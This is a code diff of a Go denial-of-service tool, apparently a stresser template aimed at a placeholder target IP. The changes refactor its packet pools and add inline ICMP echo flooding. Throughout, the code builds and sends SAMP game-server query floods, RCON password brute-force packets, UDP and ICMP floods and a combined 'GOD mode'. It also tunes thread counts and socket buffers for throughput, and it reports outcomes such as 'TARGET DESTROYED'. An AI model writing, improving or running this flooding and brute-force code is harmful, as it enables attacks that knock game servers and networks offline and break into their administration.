@@ -24,7 +24,7 @@ var (
     stopFlag     int32  = 0
 )
 
-// Pre-allocated packet pools
+// Pre-allocated packet pools (HANYA YANG DIGUNAKAN)
 var (
     sampPackets   [][]byte
     udpPackets    [][]byte
@@ -33,18 +33,7 @@ var (
     playerPackets [][]byte
     dnsQueries    [][]byte
     ntpRequests   [][]byte
-    tcpPackets    [][]byte
-    icmpPackets   [][]byte
-    httpRequests  [][]byte
 )
-
-// Smart resource manager
-type ResourceManager struct {
-    maxCPUPercent   int32
-    maxMemoryMB     int64
-    currentLoad     int32
-    adaptiveDelay   int64
-}
 
 func main() {
     targetIP := "{{.TargetIP}}"
@@ -88,7 +77,7 @@ func main() {
     safeMemoryMB := availableMemoryMB / 2
     
     // Calculate optimal threads based on CPU and memory
-    maxThreadsByCPU := cpuCores * 1500 // Safe limit (1500 per core, not 3000)
+    maxThreadsByCPU := cpuCores * 1500 // Safe limit (1500 per core)
     maxThreadsByMemory := int(safeMemoryMB / 8) // ~8MB per thread overhead
     
     optimalThreads := maxThreadsByCPU
@@ -113,8 +102,7 @@ func main() {
     fmt.Printf("[✓] CPU: %d cores | Memory: %d MB (safe: %d MB)", cpuCores, availableMemoryMB, safeMemoryMB)
     fmt.Printf("\n[✓] Optimal Threads: %d | Threads/Core: %d\n", baseThreads, threadsPerCore)
     
-    // Adaptive delay mechanism
-    adaptiveDelay := int64(1) // Start with minimal delay
+    // Adaptive delay mechanism (FIXED: only one variable)
     var adaptiveDelayAtomic int64 = 1
     
     // Socket buffer optimal (not excessive)
@@ -122,7 +110,6 @@ func main() {
         file, err := conn.File()
         if err == nil {
             fd := int(file.Fd())
-            // Use 8MB buffer (balanced)
             syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, 8*1024*1024)
             syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 8*1024*1024)
             file.Close()
@@ -133,7 +120,7 @@ func main() {
     fmt.Printf("\n[1/5] Generating SAMP packet variants (adaptive)... ")
     
     // Adaptive packet count based on memory
-    packetCount := 25000 // Default
+    packetCount := 25000
     if safeMemoryMB > 1024 {
         packetCount = 50000
     } else if safeMemoryMB > 512 {
@@ -144,7 +131,7 @@ func main() {
     
     sampPackets = make([][]byte, packetCount)
     
-    // Headers
+    // Headers - 16 variants
     headerVariants := make([][]byte, 16)
     for i := 0; i < 16; i++ {
         h := make([]byte, 8)
@@ -160,7 +147,7 @@ func main() {
         queryTypes[i] = 0x69 + byte(i)
     }
     
-    // Generate with progressive patterns
+    // Generate packets
     for i := 0; i < packetCount; i++ {
         size := 64 + rand.Intn(1984)
         packet := make([]byte, size)
@@ -227,7 +214,7 @@ func main() {
     }
     fmt.Printf("OK (%d variants)\n", packetCount)
     
-    // ==================== RCON BRUTE (OPTIMIZED) ====================
+    // ==================== RCON BRUTE ====================
     fmt.Printf("[2/5] Generating RCON brute packets... ")
     
     rconPackets = make([][]byte, 5000)
@@ -250,7 +237,7 @@ func main() {
     }
     fmt.Printf("OK\n")
     
-    // ==================== UDP FLOOD (OPTIMIZED) ====================
+    // ==================== UDP FLOOD ====================
     fmt.Printf("[3/5] Generating UDP flood packets... ")
     
     udpPackets = make([][]byte, 10000)
@@ -378,11 +365,9 @@ func main() {
         for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
             time.Sleep(2 * time.Second)
             
-            // Check CPU load via system (simplified)
             var m runtime.MemStats
             runtime.ReadMemStats(&m)
             
-            // If memory usage > 80%, increase delay
             memPercent := float64(m.Alloc) / float64(m.Sys) * 100
             if memPercent > 80 {
                 newDelay := atomic.LoadInt64(&adaptiveDelayAtomic) + 2
@@ -411,7 +396,7 @@ func main() {
                 for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                     delay := atomic.LoadInt64(&adaptiveDelayAtomic)
                     
-                    burstSize := 2 + rand.Intn(3) // 2-4 packets (reduced for stability)
+                    burstSize := 2 + rand.Intn(3)
                     for b := 0; b < burstSize; b++ {
                         packet := udpPackets[rand.Intn(10000)]
                         conn.conn.Write(packet)
@@ -421,7 +406,7 @@ func main() {
                     time.Sleep(time.Microsecond * time.Duration(delay))
                 }
             }()
-            time.Sleep(time.Millisecond * 2) // Staggered start
+            time.Sleep(time.Millisecond * 2)
         }
         
     case "SAMP":
@@ -437,7 +422,6 @@ func main() {
         fmt.Printf("  ├─ Rules Query: %d threads\n", rulesThreads)
         fmt.Printf("  └─ Player Query: %d threads\n", playerThreads)
         
-        // Normal queries
         for i := 0; i < normalThreads; i++ {
             go func() {
                 conn := udpPool.Get().(*connection)
@@ -454,7 +438,6 @@ func main() {
             }()
         }
         
-        // RCON brute
         for i := 0; i < rconThreads; i++ {
             go func() {
                 conn := udpPool.Get().(*connection)
@@ -471,7 +454,6 @@ func main() {
             }()
         }
         
-        // Rules & Player
         for i := 0; i < rulesThreads; i++ {
             go func() {
                 conn := udpPool.Get().(*connection)
@@ -617,7 +599,6 @@ func main() {
     case "GOD":
         fmt.Printf("[VECTOR] SMART GOD MODE - ALL METHODS COMBINED\n")
         
-        // Balanced distribution (lower thread counts for stability)
         sampNormalThreads := baseThreads * 22 / 100
         sampRCONThreads := baseThreads * 18 / 100
         sampRulesThreads := baseThreads * 15 / 100
@@ -795,12 +776,16 @@ func main() {
                 }
                 defer conn.Close()
                 
+                icmpPacket := make([]byte, 64)
+                icmpPacket[0] = 8
+                icmpPacket[1] = 0
+                
                 for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                     delay := atomic.LoadInt64(&adaptiveDelayAtomic)
-                    packet := icmpPackets[rand.Intn(1000)]
-                    conn.Write(packet)
+                    binary.BigEndian.PutUint16(icmpPacket[2:4], uint16(rand.Intn(65535)))
+                    conn.Write(icmpPacket)
                     atomic.AddUint64(&totalPackets, 1)
-                    atomic.AddUint64(&totalBytes, uint64(len(packet)))
+                    atomic.AddUint64(&totalBytes, 64)
                     time.Sleep(time.Millisecond * time.Duration(delay))
                 }
             }()
@@ -859,7 +844,6 @@ func main() {
             peakBandwidth = uint64(gbps * 1000)
         }
         
-        // Show adaptive delay status
         currentDelay := atomic.LoadInt64(&adaptiveDelayAtomic)
         fmt.Printf("\r[%.0fs] PPS: %.0f | MBPS: %.1f | GBPS: %.2f | DELAY: %dµs | TOTAL: %s packets", 
             elapsed, pps, mbps, gbps, currentDelay, formatNumber(int64(currentPackets)))
@@ -892,36 +876,26 @@ func main() {
     fmt.Printf("║  ⚡ PEAK GBPS:           %.2f Gbps                                           ║\n", float64(peakBandwidth)/1000)
     fmt.Printf("║                                                                                                  ║\n")
     
-    // Impact assessment
     impact := ""
     if avgGBPS > 100 {
-        impact = fmt.Sprintf("%s💀💀💀 APOCALYPSE - NETWORK COLLAPSE 💀💀💀%s", COLOR_RED, COLOR_RESET)
+        impact = "💀💀💀 APOCALYPSE - NETWORK COLLAPSE 💀💀💀"
     } else if avgGBPS > 50 {
-        impact = fmt.Sprintf("%s💀💀 TARGET DESTROYED 💀💀%s", COLOR_RED, COLOR_RESET)
+        impact = "💀💀 TARGET DESTROYED 💀💀"
     } else if avgGBPS > 20 {
-        impact = fmt.Sprintf("%s💀 TARGET DOWN 💀%s", COLOR_RED, COLOR_RESET)
+        impact = "💀 TARGET DOWN 💀"
     } else if avgGBPS > 10 {
-        impact = fmt.Sprintf("%s⚠️ TARGET CRASHED ⚠️%s", COLOR_YELLOW, COLOR_RESET)
+        impact = "⚠️ TARGET CRASHED ⚠️"
     } else if avgGBPS > 5 {
-        impact = fmt.Sprintf("%s⚠️ TARGET LAGGING ⚠️%s", COLOR_YELLOW, COLOR_RESET)
+        impact = "⚠️ TARGET LAGGING ⚠️"
     } else if avgGBPS > 1 {
-        impact = fmt.Sprintf("%sℹ️ LIGHT DAMAGE ℹ️%s", COLOR_BLUE, COLOR_RESET)
+        impact = "ℹ️ LIGHT DAMAGE ℹ️"
     } else {
-        impact = fmt.Sprintf("%s✅ NO DAMAGE ✅%s", COLOR_GREEN, COLOR_RESET)
+        impact = "✅ NO DAMAGE ✅"
     }
     
     fmt.Printf("║  %-80s ║\n", impact)
     fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════════════════════════╝\n")
 }
-
-// Color codes (for impact assessment)
-var (
-    COLOR_RED   = "\033[91m"
-    COLOR_GREEN = "\033[92m"
-    COLOR_YELLOW = "\033[93m"
-    COLOR_BLUE  = "\033[94m"
-    COLOR_RESET = "\033[0m"
-)
 
 func formatNumber(n int64) string {
     if n < 1000 {
@@ -937,13 +911,4 @@ func formatNumber(n int64) string {
         return fmt.Sprintf("%.1fB", float64(n)/1000000000)
     }
     return fmt.Sprintf("%.1fT", float64(n)/1000000000000)
-}
-
-func randomString(length int) string {
-    chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-    result := make([]byte, length)
-    for i := range result {
-        result[i] = chars[rand.Intn(len(chars))]
-    }
-    return string(result)
 }
